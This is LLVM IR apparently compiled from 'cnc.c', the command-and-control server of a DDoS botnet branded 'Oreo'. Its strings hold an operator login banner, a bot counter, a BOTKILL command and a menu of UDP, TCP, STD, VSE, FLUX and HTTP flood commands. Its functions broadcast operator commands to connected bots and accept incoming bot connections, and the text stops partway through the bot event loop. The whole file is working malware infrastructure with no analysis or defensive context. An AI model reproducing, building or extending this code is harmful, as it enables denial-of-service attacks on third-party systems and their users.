; ModuleID = 'cnc.c'
source_filename = "cnc.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.clientdata_t = type { i32, i8 }
%struct.telnetdata_t = type { i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, %struct._IO_codecvt*, %struct._IO_wide_data*, %struct._IO_FILE*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type opaque
%struct._IO_codecvt = type opaque
%struct._IO_wide_data = type opaque
%struct.login_info = type { [100 x i8], [100 x i8] }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@clients = dso_local global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = dso_local global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str.1 = private unnamed_addr constant [8 x i8] c"\1B[1;35m\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.3 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.4 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.5 = private unnamed_addr constant [12 x i8] c"!* BOTKILL\0A\00", align 1
@.str.6 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.7 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"REPORT \00", align 1
@telFD = internal global %struct._IO_FILE* null, align 8
@.str.9 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@TELFound = internal global i32 0, align 4
@.str.10 = private unnamed_addr constant [8 x i8] c"PROBING\00", align 1
@scannerreport = internal global i32 0, align 4
@.str.11 = private unnamed_addr constant [15 x i8] c"REMOVING PROBE\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.13 = private unnamed_addr constant [11 x i8] c"buf: \22%s\22\0A\00", align 1
@.str.14 = private unnamed_addr constant [10 x i8] c"login.txt\00", align 1
@.str.15 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.16 = private unnamed_addr constant [28 x i8] c"%c]0; Devices %d  |  %s  %c\00", align 1
@accounts = internal global [100 x %struct.login_info] zeroinitializer, align 16
@OperatorsConnected = internal global i32 0, align 4
@.str.17 = private unnamed_addr constant [6 x i8] c"%s %s\00", align 1
@.str.18 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.19 = private unnamed_addr constant [21 x i8] c"\1B[36mUsername\1B[97m: \00", align 1
@.str.20 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.21 = private unnamed_addr constant [21 x i8] c"\1B[36mPassword\1B[97m: \00", align 1
@.str.22 = private unnamed_addr constant [50 x i8] c"\1B[35m                                          \0D\0A\00", align 1
@.str.23 = private unnamed_addr constant [107 x i8] c"\1B[35m   \E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\95\97  \E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\95\97  \E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\95\97  \E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\95\97   \0D\0A\00", align 1
@.str.24 = private unnamed_addr constant [117 x i8] c"\1B[35m  \E2\96\88\E2\96\88\E2\95\94\E2\95\90\E2\95\90\E2\95\90\E2\96\88\E2\96\88\E2\95\97 \E2\96\88\E2\96\88\E2\95\94\E2\95\90\E2\95\90\E2\96\88\E2\96\88\E2\95\97 \E2\96\88\E2\96\88\E2\95\94\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\9D \E2\96\88\E2\96\88\E2\95\94\E2\95\90\E2\95\90\E2\95\90\E2\96\88\E2\96\88\E2\95\97  \0D\0A\00", align 1
@.str.25 = private unnamed_addr constant [101 x i8] c"\1B[35m  \E2\96\88\E2\96\88\E2\95\91   \E2\96\88\E2\96\88\E2\95\91 \E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\95\94\E2\95\9D \E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\95\97   \E2\96\88\E2\96\88\E2\95\91   \E2\96\88\E2\96\88\E2\95\91  \0D\0A\00", align 1
@.str.26 = private unnamed_addr constant [101 x i8] c"\1B[35m  \E2\96\88\E2\96\88\E2\95\91   \E2\96\88\E2\96\88\E2\95\91 \E2\96\88\E2\96\88\E2\95\94\E2\95\90\E2\95\90\E2\96\88\E2\96\88\E2\95\97 \E2\96\88\E2\96\88\E2\95\94\E2\95\90\E2\95\90\E2\95\9D   \E2\96\88\E2\96\88\E2\95\91   \E2\96\88\E2\96\88\E2\95\91  \0D\0A\00", align 1
@.str.27 = private unnamed_addr constant [113 x i8] c"\1B[35m  \E2\95\9A\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\95\94\E2\95\9D \E2\96\88\E2\96\88\E2\95\91  \E2\96\88\E2\96\88\E2\95\91 \E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\95\97 \E2\95\9A\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\95\94\E2\95\9D  \0D\0A\00", align 1
@.str.28 = private unnamed_addr constant [105 x i8] c"\1B[35m   \E2\95\9A\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\9D  \E2\95\9A\E2\95\90\E2\95\9D  \E2\95\9A\E2\95\90\E2\95\9D \E2\95\9A\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\9D  \E2\95\9A\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\9D   \0D\0A\00", align 1
@.str.29 = private unnamed_addr constant [49 x i8] c"\1B[35m                                         \0D\0A\00", align 1
@.str.30 = private unnamed_addr constant [50 x i8] c"                                               \0D\0A\00", align 1
@.str.31 = private unnamed_addr constant [35 x i8] c"\1B[32m%s\1B[36m@\1B[35mOreo\1B[94m#\1B[37m \00", align 1
@.str.32 = private unnamed_addr constant [5 x i8] c"BOTS\00", align 1
@.str.33 = private unnamed_addr constant [26 x i8] c"\1B[35mDevices:   \1B[32m%d\0D\0A\00", align 1
@.str.34 = private unnamed_addr constant [26 x i8] c"\1B[35mMasters:   \1B[32m%d\0D\0A\00", align 1
@.str.35 = private unnamed_addr constant [5 x i8] c"HELP\00", align 1
@.str.36 = private unnamed_addr constant [42 x i8] c"\1B[37m[---\1B[31mList of Commands\1B[37m---]\0D\0A\00", align 1
@.str.37 = private unnamed_addr constant [58 x i8] c"\1B[32mSTOP         \1B[37m| \1B[36mKills All Current Attacks\0D\0A\00", align 1
@.str.38 = private unnamed_addr constant [59 x i8] c"\1B[32mBOTS         \1B[37m| \1B[36mShows The Current Botcount\0D\0A\00", align 1
@.str.39 = private unnamed_addr constant [56 x i8] c"\1B[32mATTACKS       \1B[37m| \1B[36mDisplays DDoS Commands\0D\0A\00", align 1
@.str.40 = private unnamed_addr constant [50 x i8] c"\1B[32mCLEAR        \1B[37m| \1B[36mClears You Screen\0D\0A\00", align 1
@.str.41 = private unnamed_addr constant [8 x i8] c"ATTACKS\00", align 1
@.str.42 = private unnamed_addr constant [43 x i8] c"\1B[37m[----\1B[31mAttack Commands\1B[37m----]\0D\0A\00", align 1
@.str.43 = private unnamed_addr constant [89 x i8] c"\1B[32m!* UDP \1B[35mIP PORT TIME 32 0 10                 \1B[37m|\1B[36m Launches A UDP Flood\0D\0A\00", align 1
@.str.44 = private unnamed_addr constant [89 x i8] c"\1B[32m!* TCP \1B[35mIP PORT TIME 32 FLAGS 0 10           \1B[37m|\1B[36m Launches A TCP Flood\0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [89 x i8] c"\1B[32m!* STD \1B[35mIP PORT TIME                         \1B[37m|\1B[36m Launches A STD Flood\0D\0A\00", align 1
@.str.46 = private unnamed_addr constant [89 x i8] c"\1B[32m!* VSE \1B[35mIP PORT TIME 32 1024 1               \1B[37m|\1B[36m Launches A VSE Flood\0D\0A\00", align 1
@.str.47 = private unnamed_addr constant [90 x i8] c"\1B[32m!* FLUX \1B[35mIP PORT TIME 32 1024 1              \1B[37m|\1B[36m Launches A FLUX Flood\0D\0A\00", align 1
@.str.48 = private unnamed_addr constant [90 x i8] c"\1B[32m!* HTTP \1B[35mGHP 80 / TIME POWER                 \1B[37m|\1B[36m Launches A HTTP Flood\0D\0A\00", align 1
@.str.49 = private unnamed_addr constant [93 x i8] c"\1B[32m!* HTTPHEX \1B[35mGHP 80 / TIME POWER              \1B[37m|\1B[36m Launches A HTTPHEX Flood\0D\0A\00", align 1
@.str.50 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.51 = private unnamed_addr constant [53 x i8] c"\1B[96m[ATTACKS] \1B[37mAttempting To Stop All Attacks\0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [8 x i8] c"output.\00", align 1
@.str.53 = private unnamed_addr constant [6 x i8] c"CLEAR\00", align 1
@.str.54 = private unnamed_addr constant [11 x i8] c"\1B[2J\1B[1;1H\00", align 1
@.str.55 = private unnamed_addr constant [5 x i8] c"EXIT\00", align 1
@.str.56 = private unnamed_addr constant [42 x i8] c"\1B[96m[LOGOUT] \1B[37m%s Has Been Logged Out\00", align 1
@.str.57 = private unnamed_addr constant [10 x i8] c"%s: \22%s\22\0A\00", align 1
@.str.58 = private unnamed_addr constant [12 x i8] c"history.log\00", align 1
@.str.59 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.60 = private unnamed_addr constant [9 x i8] c"%I:%M %p\00", align 1
@.str.61 = private unnamed_addr constant [13 x i8] c"[%s] %s: %s\0A\00", align 1
@.str.62 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.63 = private unnamed_addr constant [17 x i8] c"ERROR on binding\00", align 1
@.str.64 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.65 = private unnamed_addr constant [39 x i8] c"Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.66 = private unnamed_addr constant [11 x i8] c"telnet.txt\00", align 1
@.str.67 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.68 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.69 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.70 = private unnamed_addr constant [5 x i8] c"ZERO\00", align 1
@.str.71 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@.str.72 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.73 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.74 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @fdgets(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  br label %9

9:                                                ; preds = %27, %3
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

12:                                               ; preds = %9
  %13 = load i32, i32* %7, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

16:                                               ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %7, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

25:                                               ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

27:                                               ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %8, align 4
  %35 = load i32, i32* %7, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %7, align 4
  br label %9, !llvm.loop !6

37:                                               ; preds = %25
  %38 = load i32, i32* %8, align 4
  ret i32 %38
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @trim(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #8
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

10:                                               ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #8
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

19:                                               ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10, !llvm.loop !8

22:                                               ; preds = %10
  br label %23

23:                                               ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

27:                                               ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #8
  %35 = icmp ne i32 %34, 0
  br label %36

36:                                               ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

38:                                               ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23, !llvm.loop !9

41:                                               ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

43:                                               ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

47:                                               ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

59:                                               ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43, !llvm.loop !10

62:                                               ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind readonly willreturn
declare i32 @isspace(i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @broadcast(i8* %0, i32 %1, i8* %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca %struct.tm*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i8* %2, i8** %6, align 8
  store i32 1, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @strcmp(i8* %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #8
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %16, label %17

16:                                               ; preds = %3
  store i32 0, i32* %7, align 4
  br label %17

17:                                               ; preds = %16, %3
  %18 = load i8*, i8** %4, align 8
  %19 = call i64 @strlen(i8* %18) #8
  %20 = add i64 %19, 10
  %21 = call noalias align 16 i8* @malloc(i64 %20) #9
  store i8* %21, i8** %8, align 8
  %22 = load i8*, i8** %8, align 8
  %23 = load i8*, i8** %4, align 8
  %24 = call i64 @strlen(i8* %23) #8
  %25 = add i64 %24, 10
  call void @llvm.memset.p0i8.i64(i8* align 1 %22, i8 0, i64 %25, i1 false)
  %26 = load i8*, i8** %8, align 8
  %27 = load i8*, i8** %4, align 8
  %28 = call i8* @strcpy(i8* %26, i8* %27) #9
  %29 = load i8*, i8** %8, align 8
  call void @trim(i8* %29)
  %30 = call i64 @time(i64* %9) #9
  %31 = call %struct.tm* @localtime(i64* %9) #9
  store %struct.tm* %31, %struct.tm** %10, align 8
  %32 = load %struct.tm*, %struct.tm** %10, align 8
  %33 = call i8* @asctime(%struct.tm* %32) #9
  store i8* %33, i8** %11, align 8
  %34 = load i8*, i8** %11, align 8
  call void @trim(i8* %34)
  store i32 0, i32* %12, align 4
  br label %35

35:                                               ; preds = %78, %17
  %36 = load i32, i32* %12, align 4
  %37 = icmp slt i32 %36, 1000000
  br i1 %37, label %38, label %81

38:                                               ; preds = %35
  %39 = load i32, i32* %12, align 4
  %40 = load i32, i32* %5, align 4
  %41 = icmp eq i32 %39, %40
  br i1 %41, label %49, label %42

42:                                               ; preds = %38
  %43 = load i32, i32* %12, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %44
  %46 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %45, i32 0, i32 1
  %47 = load i8, i8* %46, align 4
  %48 = icmp ne i8 %47, 0
  br i1 %48, label %50, label %49

49:                                               ; preds = %42, %38
  br label %78

50:                                               ; preds = %42
  %51 = load i32, i32* %7, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %70

53:                                               ; preds = %50
  %54 = load i32, i32* %12, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %55
  %57 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %56, i32 0, i32 0
  %58 = load i32, i32* %57, align 4
  %59 = icmp ne i32 %58, 0
  br i1 %59, label %60, label %70

60:                                               ; preds = %53
  %61 = load i32, i32* %12, align 4
  %62 = call i64 @send(i32 %61, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i64 9, i32 16384)
  %63 = load i32, i32* %12, align 4
  %64 = load i8*, i8** %6, align 8
  %65 = load i8*, i8** %6, align 8
  %66 = call i64 @strlen(i8* %65) #8
  %67 = call i64 @send(i32 %63, i8* %64, i64 %66, i32 16384)
  %68 = load i32, i32* %12, align 4
  %69 = call i64 @send(i32 %68, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i64 2, i32 16384)
  br label %70

70:                                               ; preds = %60, %53, %50
  %71 = load i32, i32* %12, align 4
  %72 = load i8*, i8** %4, align 8
  %73 = load i8*, i8** %4, align 8
  %74 = call i64 @strlen(i8* %73) #8
  %75 = call i64 @send(i32 %71, i8* %72, i64 %74, i32 16384)
  %76 = load i32, i32* %12, align 4
  %77 = call i64 @send(i32 %76, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0), i64 1, i32 16384)
  br label %78

78:                                               ; preds = %70, %49
  %79 = load i32, i32* %12, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %12, align 4
  br label %35, !llvm.loop !11

81:                                               ; preds = %35
  %82 = load i8*, i8** %8, align 8
  call void @free(i8* %82) #9
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8*, i8*) #2

; Function Attrs: nounwind
declare noalias align 16 i8* @malloc(i64) #3

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #4

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) #3

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) #3

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @BotEventLoop(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.epoll_event, align 1
  %4 = alloca %struct.epoll_event*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr, align 2
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.clientdata_t*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i64, align 8
  %17 = alloca [2048 x i8], align 16
  %18 = alloca i8*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %21 = call noalias align 16 i8* @calloc(i64 1000000, i64 12) #9
  %22 = bitcast i8* %21 to %struct.epoll_event*
  store %struct.epoll_event* %22, %struct.epoll_event** %4, align 8
  br label %23

23:                                               ; preds = %1, %295
  %24 = load volatile i32, i32* @epollFD, align 4
  %25 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %26 = call i32 @epoll_wait(i32 %24, %struct.epoll_event* %25, i32 1000000, i32 -1)
  store i32 %26, i32* %6, align 4
  store i32 0, i32* %7, align 4
  br label %27

27:                                               ; preds = %292, %23
  %28 = load i32, i32* %7, align 4
  %29 = load i32, i32* %6, align 4
  %30 = icmp slt i32 %28, %29
  br i1 %30, label %31, label %295

31:                                               ; preds = %27
  %32 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %33 = load i32, i32* %7, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %32, i64 %34
  %36 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %35, i32 0, i32 0
  %37 = load i32, i32* %36, align 1
  %38 = and i32 %37, 8
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %58, label %40

40:                                               ; preds = %31
  %41 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %41, i64 %43
  %45 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %44, i32 0, i32 0
  %46 = load i32, i32* %45, align 1
  %47 = and i32 %46, 16
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %58, label %49

49:                                               ; preds = %40
  %50 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %51 = load i32, i32* %7, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %50, i64 %52
  %54 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %53, i32 0, i32 0
  %55 = load i32, i32* %54, align 1
  %56 = and i32 %55, 1
  %57 = icmp ne i32 %56, 0
  br i1 %57, label %77, label %58

58:                                               ; preds = %49, %40, %31
  %59 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %60 = load i32, i32* %7, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %59, i64 %61
  %63 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %62, i32 0, i32 1
  %64 = bitcast %union.epoll_data* %63 to i32*
  %65 = load i32, i32* %64, align 1
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %66
  %68 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %67, i32 0, i32 1
  store i8 0, i8* %68, align 4
  %69 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %70 = load i32, i32* %7, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %69, i64 %71
  %73 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %72, i32 0, i32 1
  %74 = bitcast %union.epoll_data* %73 to i32*
  %75 = load i32, i32* %74, align 1
  %76 = call i32 @close(i32 %75)
  br label %292

77:                                               ; preds = %49
  %78 = load volatile i32, i32* @listenFD, align 4
  %79 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %80 = load i32, i32* %7, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %79, i64 %81
  %83 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %82, i32 0, i32 1
  %84 = bitcast %union.epoll_data* %83 to i32*
  %85 = load i32, i32* %84, align 1
  %86 = icmp eq i32 %78, %85
  br i1 %86, label %87, label %184

87:                                               ; preds = %77
  br label %88

88:                                               ; preds = %87, %151, %154, %178
  store i32 16, i32* %9, align 4
  %89 = load volatile i32, i32* @listenFD, align 4
  %90 = call i32 @accept(i32 %89, %struct.sockaddr* %8, i32* %9)
  store i32 %90, i32* %10, align 4
  %91 = load i32, i32* %10, align 4
  %92 = icmp eq i32 %91, -1
  br i1 %92, label %93, label %103

93:                                               ; preds = %88
  %94 = call i32* @__errno_location() #10
  %95 = load i32, i32* %94, align 4
  %96 = icmp eq i32 %95, 11
  br i1 %96, label %101, label %97

97:                                               ; preds = %93
  %98 = call i32* @__errno_location() #10
  %99 = load i32, i32* %98, align 4
  %100 = icmp eq i32 %99, 11
  br i1 %100, label %101, label %102

101:                                              ; preds = %97, %93
  br label %183

102:                                              ; preds = %97
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  br label %183

103:                                              ; preds = %88
  %104 = bitcast %struct.sockaddr* %8 to %struct.sockaddr_in*
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %104, i32 0, i32 2
  %106 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %105, i32 0, i32 0
  %107 = load i32, i32* %106, align 2
  %108 = load i32, i32* %10, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %109
  %111 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %110, i32 0, i32 0
  store i32 %107, i32* %111, align 8
  store i32 0, i32* %12, align 4
  store i32 0, i32* %11, align 4
  br label %112

112:                                              ; preds = %141, %103
  %113 = load i32, i32* %11, align 4
  %114 = icmp slt i32 %113, 1000000
  br i1 %114, label %115, label %144

115:                                              ; preds = %112
  %116 = load i32, i32* %11, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %117
  %119 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %118, i32 0, i32 1
  %120 = load i8, i8* %119, align 4
  %121 = icmp ne i8 %120, 0
  br i1 %121, label %122, label %126

122:                                              ; preds = %115
  %123 = load i32, i32* %11, align 4
  %124 = load i32, i32* %10, align 4
  %125 = icmp eq i32 %123, %124
  br i1 %125, label %126, label %127

126:                                              ; preds = %122, %115
  br label %141

127:                                              ; preds = %122
  %128 = load i32, i32* %11, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %129
  %131 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %130, i32 0, i32 0
